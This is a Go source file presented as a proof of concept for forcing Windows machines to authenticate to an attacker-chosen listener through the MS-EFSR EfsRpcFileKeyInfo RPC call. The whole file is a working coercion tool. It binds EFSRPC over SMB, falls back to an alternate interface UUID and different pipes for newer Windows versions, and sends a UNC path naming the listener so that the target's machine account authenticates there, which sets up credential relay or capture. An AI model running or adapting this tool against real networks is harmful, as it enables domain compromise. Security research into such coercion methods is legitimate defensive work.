// File name          : coerce_poc.go
// Author             : Podalirius (@podalirius_)
// Date created       : 10 Sep 2026
//
// Proof of concept for coercing authentication with MS-EFSR::EfsRpcFileKeyInfo()
// (opnum 12), written with the TheManticoreProject libraries:
//
//   - github.com/TheManticoreProject/goopts    for the command line parsing
//   - github.com/TheManticoreProject/Manticore for SMB, DCE/RPC and the efsrpc interface
//
// The target opens the [in,string] FileName it is given to look up the EFS key material
// of that object: passing a UNC path makes the remote machine account authenticate to the
// listener over SMB ([MS-EFSR] EfsRpcFileKeyInfo).
//
// Run it from this directory (go.mod pins the libraries):
//
//	go run coerce_poc.go --target 192.168.1.30 --listener 192.168.1.10 -d LAB.local -u user -p 'password'
//
// or build a standalone binary with:
//
//	go build -o coerce_poc coerce_poc.go
package main

import (
	"fmt"
	"os"
	"strings"

	"github.com/TheManticoreProject/Manticore/logger"
	efsrpc "github.com/TheManticoreProject/Manticore/network/dcerpc/interfaces/c681d488-d850-11d0-8c52-00c04fd90f7e/1.0"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/ndr"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/syntax"
	dcerpcclient "github.com/TheManticoreProject/Manticore/network/dcerpc/v5/client"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/v5/pdu"
	smbclient "github.com/TheManticoreProject/Manticore/network/smb/client"
	"github.com/TheManticoreProject/Manticore/windows/credentials"
	"github.com/TheManticoreProject/Manticore/windows/guid"
	msefsr "github.com/TheManticoreProject/Manticore/windows/protocols/ms-efsr"
	"github.com/TheManticoreProject/goopts/parser"
	"golang.org/x/term"
)

var (
	// Configuration
	debug bool

	// Network settings
	target     string
	targetPort int
	pipeName   string

	// Coercion settings
	listener  string
	shareName string
	filePath  string
	infoClass int

	// Authentication details
	authDomain   string
	authUsername string
	authPassword string
	authHashes   string
	authNoPass   bool
)

func parseArgs() {
	ap := parser.ArgumentsParser{
		Banner: "Windows auth coerce using MS-EFSR::EfsRpcFileKeyInfo() - by Remi GASCOU (Podalirius) - v1.0.0",
	}

	ap.SetOptShowBannerOnHelp(true)
	ap.SetOptShowBannerOnRun(true)

	ap.NewBoolArgument(&debug, "", "--debug", false, "Enable debug mode.")

	// Network settings
	group_network, err := ap.NewArgumentGroup("Network")
	if err != nil {
		fmt.Printf("[error] Error creating ArgumentGroup: %s\n", err)
	} else {
		group_network.NewStringArgument(&target, "-t", "--target", "", true, "IP address or hostname of the target.")
		group_network.NewTcpPortArgument(&targetPort, "", "--target-port", 445, false, "Port of the SMB service on the target.")
		// EFSRPC is reachable over several pipes; \efsrpc is the dedicated endpoint, but
		// \lsarpc, \samr, \netlogon and \lsass expose the same interface ([MS-EFSR] 1.9 / 2.1).
		group_network.NewStringArgument(&pipeName, "", "--pipe", efsrpc.PipeName, false, "Named pipe to bind the efsrpc interface on.")
	}

	// Coercion settings
	group_coerce, err := ap.NewArgumentGroup("Coercion")
	if err != nil {
		fmt.Printf("[error] Error creating ArgumentGroup: %s\n", err)
	} else {
		group_coerce.NewStringArgument(&listener, "-l", "--listener", "", true, "IP address or hostname of the listener the target should authenticate to.")
		group_coerce.NewStringArgument(&shareName, "", "--share", "share", false, "Share name of the UNC path sent to the target.")
		group_coerce.NewStringArgument(&filePath, "", "--file", "file.txt", false, "File name of the UNC path sent to the target.")
		// InfoClass selects which key information the server is asked for; the documented
		// values are BASIC_KEY_INFO (0x1), CHECK_COMPATIBILITY_INFO (0x2), UPDATE_KEY_USED
		// (0x100), CHECK_DECRYPTION_STATUS (0x200) and CHECK_ENCRYPTION_STATUS (0x400).
		// The default 0 is the value this method's documented PoC coerces with, see the
		// comment on the request below.
		group_coerce.NewIntArgument(&infoClass, "", "--info-class", 0, false, "InfoClass requested from the target (0, or one of 0x1, 0x2, 0x100, 0x200, 0x400).")
	}

	// Authentication
	group_auth, err := ap.NewArgumentGroup("Authentication")
	if err != nil {
		fmt.Printf("[error] Error creating ArgumentGroup: %s\n", err)
	} else {
		group_auth.NewStringArgument(&authDomain, "-d", "--domain", "", false, "(FQDN) domain to authenticate to.")
		group_auth.NewStringArgument(&authUsername, "-u", "--user", "", false, "User to authenticate as.")
	}

	// Secret
	group_secret, err := ap.NewNotRequiredMutuallyExclusiveArgumentGroup("Secret")
	if err != nil {
		fmt.Printf("[error] Error creating ArgumentGroup: %s\n", err)
	} else {
		group_secret.NewBoolArgument(&authNoPass, "", "--no-pass", false, "Don't ask for a password (null session).")
		group_secret.NewStringArgument(&authPassword, "-p", "--password", "", false, "Password to authenticate with.")
		group_secret.NewStringArgument(&authHashes, "-H", "--hashes", "", false, "NT/LM hashes, format is LMhash:NThash.")
	}

	ap.Parse()
}

// EfsRpcFileKeyInfo (opnum 12), as documented by [MS-EFSR]:
//
//	DWORD EfsRpcFileKeyInfo(
//	    [in] handle_t binding_h,
//	    [in, string] wchar_t* FileName,
//	    [in] DWORD InfoClass,
//	    [out] EFS_RPC_BLOB** KeyInfo
//	);
//
// The binding handle is implicit in Go. The request/response structs below are lifted
// verbatim from Manticore's generated call for this opnum
// (network/dcerpc/interfaces/c681d488-d850-11d0-8c52-00c04fd90f7e/1.0/functions/12_EfsRpcFileKeyInfo.go), which is the reviewed
// translation of that IDL. Manticore ships this call ready-made as
// interfaces/c681d488-.../1.0/functions.EfsRpcFileKeyInfo, but that wrapper folds a
// nonzero return value into an error string; issuing the call here keeps the numeric
// status so it can be reported by name. KeyInfo is the [out] EFS_RPC_BLOB the server
// fills on success — a coercion never gets that far, so it is only unmarshalled, not read.
// ndr.WSTR marshals FileName as the inline [ref] wide string the IDL asks for (the NUL
// terminator is added by the marshaller).

// efsRpcFileKeyInfoRequest carries the [in] parameters of EfsRpcFileKeyInfo.
type efsRpcFileKeyInfoRequest struct {
	FileName  ndr.WSTR
	InfoClass ndr.DWORD
}

// efsRpcFileKeyInfoResponse carries the [out] parameters and return value of EfsRpcFileKeyInfo.
type efsRpcFileKeyInfoResponse struct {
	KeyInfo *msefsr.EFS_RPC_BLOB `ndr:"unique"`
	Status  ndr.DWORD            `ndr:"retval"`
}

func (*efsRpcFileKeyInfoRequest) Opnum() uint16 { return efsrpc.OpnumEfsRpcFileKeyInfo }

// win32ErrorNames names the Win32 error codes ([MS-ERREF] 2.2) that this interface returns
// but that Manticore's status table for it does not cover yet. efsrpc.StatusString is
// always consulted first, so the codes Manticore does define keep their names from there
// and this map only fills the gaps. ERROR_BAD_NETPATH is the one a coercion normally ends
// on: the target could not reach the UNC path — after trying to.
var win32ErrorNames = map[uint32]string{
	0x00000003: "ERROR_PATH_NOT_FOUND",
	0x00000035: "ERROR_BAD_NETPATH",
	0x00000043: "ERROR_BAD_NET_NAME",
	0x0000007b: "ERROR_INVALID_NAME",
}

// statusName resolves a Win32 status code to its constant name, preferring Manticore's
// own table. StatusString falls back to a "0x%08x" rendering for codes it does not know,
// which is how an unknown code is detected here.
func statusName(status uint32) string {
	if name := efsrpc.StatusString(status); !strings.HasPrefix(name, "0x") {
		return name
	}
	if name, found := win32ErrorNames[status]; found {
		return name
	}
	return "UNKNOWN_ERROR"
}

// formatStatus renders a status as "ERROR_BAD_NETPATH (0x00000035)".
func formatStatus(status uint32) string {
	return fmt.Sprintf("%s (0x%08x)", statusName(status), status)
}

// altEfsrpcUUID is the second interface UUID MS-EFSR is registered under ([MS-EFSR] 1.9
// "Standards Assignments" lists both, and this folder's README lists it as Interface 2).
// It matters in practice: on Windows Server 2025 the classic
// c681d488-d850-11d0-8c52-00c04fd90f7e UUID is not registered at all — EFS exposes only
// this one, and only on \pipe\efsrpc — so a bind of the classic UUID is rejected with
// abstract_syntax_not_supported.
const altEfsrpcUUID = "df1941c5-fe89-4e79-bf10-463657acf44d"

// interfaceSyntaxes returns the abstract syntaxes to try, in order: the classic EFSRPC
// interface first, then the alternate UUID that newer Windows versions register. A
// rejected bind is a reason to try the next candidate, not to stop.
func interfaceSyntaxes() []syntax.SyntaxID {
	candidates := []syntax.SyntaxID{efsrpc.SyntaxID()}
	if uuid, err := guid.FromFormatD(altEfsrpcUUID); err == nil {
		candidates = append(candidates, syntax.SyntaxID{UUID: *uuid, MajorVersion: 1, MinorVersion: 0})
	}
	return candidates
}

// promptPassword asks for the password on the terminal, as the Python PoC does when a
// username is given with neither a password, hashes, nor --no-pass.
func promptPassword() (string, error) {
	fmt.Print("Password: ")
	secret, err := term.ReadPassword(int(os.Stdin.Fd()))
	fmt.Println()
	if err != nil {
		return "", err
	}
	return string(secret), nil
}

func main() {
	parseArgs()

	if debug {
		logger.SetLevel(logger.LevelDebug)
	}

	if authUsername != "" && authPassword == "" && authHashes == "" && !authNoPass {
		password, err := promptPassword()
		if err != nil {
			logger.Errorf("Error reading password: %s", err)
			return
		}
		authPassword = password
	}

	creds, err := credentials.NewCredentials(authDomain, authUsername, authPassword, authHashes)
	if err != nil {
		logger.Errorf("Error creating credentials: %s", err)
		return
	}

	// Negotiate the best dialect the target supports (SMB1 or SMB2+), the DCE/RPC
	// named-pipe transport is then the same for the caller either way.
	logger.Infof("Connecting to %s:%d ...", target, targetPort)
	smb, err := smbclient.Dial(target, targetPort, smbclient.Options{})
	if err != nil {
		logger.Errorf("Error connecting to %s:%d: %s", target, targetPort, err)
		return
	}
	defer smb.Disconnect()
	logger.Infof("Connected, negotiated dialect [%s]", smb.Dialect())

	if err := smb.Login(creds); err != nil {
		logger.Errorf("Error authenticating to %s: %s", target, err)
		return
	}
	defer smb.Logoff()
	logger.Infof("Authenticated as [%s]", strings.Trim(authDomain+"\\"+authUsername, "\\"))

	// Named pipes live on the IPC$ tree ([MS-RPCE] 2.1.1.2).
	if err := smb.TreeConnect("IPC$"); err != nil {
		logger.Errorf("Error connecting to share IPC$: %s", err)
		return
	}
	defer smb.TreeDisconnect()

	// A rejected bind leaves the association unusable, so every candidate syntax gets a
	// fresh pipe and client of its own.
	var rpc *dcerpcclient.Client
	for _, abstractSyntax := range interfaceSyntaxes() {
		transport, err := smb.RPCTransport(pipeName)
		if err != nil {
			logger.Errorf("Error opening pipe %s: %s", pipeName, err)
			return
		}

		logger.Infof("Binding to <%s> on %s ...", abstractSyntax, pipeName)
		candidate := dcerpcclient.NewClient(transport)
		// The EFS service wants the calls authenticated at the RPC layer on top of the SMB
		// session: an anonymously bound association is answered with
		// nca_s_fault_access_denied since [MSFT-CVE-2021-43893]. Sign and seal every PDU
		// (NTLM, packet privacy).
		if err := candidate.SetAuth(pdu.AuthTypeNTLMSSP, pdu.AuthLevelPktPrivacy, creds); err != nil {
			logger.Errorf("Error configuring RPC authentication: %s", err)
			candidate.Close()
			return
		}
		if err := candidate.Bind(abstractSyntax); err != nil {
			logger.Warnf("Bind rejected: %s", err)
			candidate.Close()
			continue
		}
		logger.Info("Bind successful")
		rpc = candidate
		break
	}
	if rpc == nil {
		logger.Errorf("Could not bind the efsrpc interface on %s, it is not listening on this endpoint.", pipeName)
		return
	}
	defer rpc.Close()

	// The UNC path the target will resolve, and therefore authenticate to.
	uncPath := fmt.Sprintf(`\\%s\%s\%s`, listener, shareName, filePath)

	logger.Infof("Calling EfsRpcFileKeyInfo(FileName='%s', InfoClass=0x%08x) ...", uncPath, uint32(infoClass))
	request := &efsRpcFileKeyInfoRequest{
		FileName: ndr.WSTR(uncPath),
		// InfoClass is not one of the documented values ([MS-EFSR] EfsRpcFileKeyInfo lists
		// BASIC_KEY_INFO 0x1 up to CHECK_ENCRYPTION_STATUS 0x400) when left at its default
		// 0: 0 is what this method's README documents the call with —
		// EfsRpcFileKeyInfo("\\<listener>\share\file.txt", 0) — and what the Python PoC
		// next to this one sends, with a captured machine-account hash to show the target
		// resolved FileName anyway. Pass --info-class 1 to request BASIC_KEY_INFO instead
		// if a target refuses the call before touching the path.
		InfoClass: ndr.DWORD(uint32(infoClass)),
	}
	var response efsRpcFileKeyInfoResponse

	if err := rpc.Invoke(request, &response); err != nil {
		// A DCE/RPC fault means the call never reached the EFSRPC method. nca_s_unk_if in
		// particular is what the lsass-aliased pipes (\lsarpc, \netlogon, \samr, \lsass)
		// answer on Windows Server 2025: they accept the bind but dispatch no EFSRPC call,
		// so retry with --pipe \efsrpc.
		logger.Errorf("EfsRpcFileKeyInfo() faulted: %s", err)
		return
	}

	status := uint32(response.Status)
	if status == efsrpc.StatusSuccess {
		logger.Infof("EfsRpcFileKeyInfo() returned %s, check your listener.", formatStatus(status))
		return
	}
	// Any other status is expected: the target cannot read the key information of a file it
	// cannot reach, but it has already authenticated to the listener to find that out.
	logger.Infof("EfsRpcFileKeyInfo() returned a status: %s", formatStatus(status))
	logger.Info("The call was processed by the target, check your listener.")
}
